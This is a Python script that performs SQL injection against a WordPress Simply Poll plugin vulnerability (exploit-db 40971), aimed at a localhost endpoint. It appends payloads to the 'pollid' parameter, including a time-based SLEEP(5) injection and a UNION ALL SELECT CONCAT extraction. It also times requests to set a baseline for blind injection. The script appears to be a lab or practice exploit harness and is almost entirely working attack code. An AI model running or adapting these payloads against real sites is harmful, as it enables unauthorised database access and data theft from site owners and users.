#coding:utf-8
import requests
import copy
import time

class HttpTarget:
    """describe a target with an url, a default payload and the vulnerable param"""
    def __init__(self, url, payload, param):
        self.url = url
        self.payload = payload        
        self.param = param

## targets
#https://www.exploit-db.com/exploits/40971
simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
                         {'action': 'spAjaxResults', 'pollid': '2'},
                         "pollid")

def post_request(target, injtxt): 
    """send a post request to the target with a supplement to the vulnerable param and return server response"""
    injected_target = copy.deepcopy(target)
    injected_target.payload[target.param] = target.payload[target.param] + injtxt
    r = requests.post(injected_target.url, data=injected_target.payload)    
    #print("[POST]", r.url)
    #print(r.text)
    return r

def get_default_average_time(target, nb=10):
    """get average time for wrong requests"""
    som = 0
    for i in range(nb):        
        start = time.clock()
        post_request(target, chr((10000+i)%55295)+chr((20000+i)%55295))
        end = time.clock()
        som += (end - start)
    return som/nb


## tests
# post_request 
# ## wrong post
print(post_request(simply_poll, chr(156)).text)
# ## injection SQL (sleep 5s)
print(post_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
# ## injection SQL (CONCAT)
print(post_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)

# get_default_average_time
print(get_default_average_time(simply_poll))